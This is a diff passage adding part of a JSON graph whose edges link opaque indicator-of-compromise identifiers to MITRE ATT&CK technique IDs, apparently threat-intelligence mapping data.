+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "IOC_5a0a14ee2a51",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "IOC_85e510a32c55",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "IOC_85e510a32c55",
+      "node_v": "TTP_T1132"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "IOC_85e510a32c55",
+      "node_v": "TTP_T1140"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "IOC_8e55aa892862",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_33",
+      "node_u": "IOC_b2df890376f8",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_34",
+      "node_u": "IOC_b2df890376f8",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_35",
+      "node_u": "IOC_b4454ab3f535",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_36",
+      "node_u": "IOC_b4454ab3f535",
+      "node_v": "TTP_T1552"
+    }
+  ]
+}
